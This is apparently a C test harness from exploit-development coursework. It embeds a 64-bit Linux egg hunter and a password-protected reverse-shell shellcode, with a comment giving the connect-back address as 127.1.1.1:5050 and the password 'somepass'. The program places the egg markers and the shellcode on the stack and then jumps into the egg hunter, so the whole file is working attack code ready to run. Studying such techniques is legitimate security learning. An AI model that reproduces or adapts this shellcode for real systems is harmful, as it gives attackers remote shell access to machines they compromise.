// File: shellcode_no_memcheck.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// remember egg hunter assembly, mov edx, 0x464e464e (high memory first)
#define EGG "\x4e\x46\x4e\x46" // (low memory first)

// this line inserts 1x EGG string to binary .data section
unsigned char egg[] = EGG;

// this line inserts 1x EGG string to binary .data section
unsigned char egghunter[] = \
"\x48\x89\xe0\xba\x4e\x46\x4e\x46\x48\xff\xc0\x39\x10\x75\xf9\x39\x50\x04\x75\xf4\xff\xe0";

unsigned char shellcode[] = \
// revshell, 127.1.1.1:5050, password:somepass
"\xeb\x08\x73\x6f\x6d\x65\x70\x61\x73\x73\x4d\x31\xc9\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x49\x0f\xaf\xd1\x0f\x05\x48\x89\xc7\x6a\x2a\x58\x41\x51\x68\x7f\x01\x01\x01\x66\x68\x13\xba\x66\x6a\x02\x48\x89\xe6\x48\x83\xc2\x10\x0f\x05\x6a\x02\x5e\x6a\x21\x58\x0f\x05\x48\xff\xce\x79\xf6\x41\x51\x48\x89\xe6\x48\x83\xc2\x08\x0f\x05\x48\x8b\x05\xaa\xff\xff\xff\x48\x89\xf7\x48\xaf\x75\x1e\x41\x51\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x41\x51\x48\x89\xe2\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05\x6a\x3c\x58\x0f\x05";

main()
{
    printf("Egghunter Length:  %zd\n", sizeof(egghunter) - 1);

    char stack[200];
    printf("Memory location of shellcode: %p\n", stack);

    // this 2 lines inserts 2x EGG strings to binary [stack] section
    strcpy(stack, egg);
    strcpy(stack + 4, egg);
    strcpy(stack + 8, shellcode);

    int (*CodeFun)() = (int(*)())egghunter;
    CodeFun();
}
